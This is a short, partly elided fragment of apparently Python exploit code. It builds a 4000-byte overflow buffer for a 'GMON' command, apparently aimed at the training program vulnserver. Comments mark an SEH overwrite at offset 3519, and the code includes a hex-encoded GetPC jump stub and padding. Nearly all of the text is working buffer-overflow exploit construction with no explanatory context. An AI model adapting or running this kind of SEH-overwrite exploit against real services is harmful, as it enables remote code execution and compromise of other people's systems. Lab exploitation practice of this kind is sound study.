...
# PAYLOAD LENGHT IS : 4000

buf = 'GMON /.:/'

# [*] Exact match at offset 3519 : SEH overwrite
...
mov_eip = "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x10\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1"

buf += mov_eip

buf += "C"*(4000-3519-4-len(mov_eip)-2)
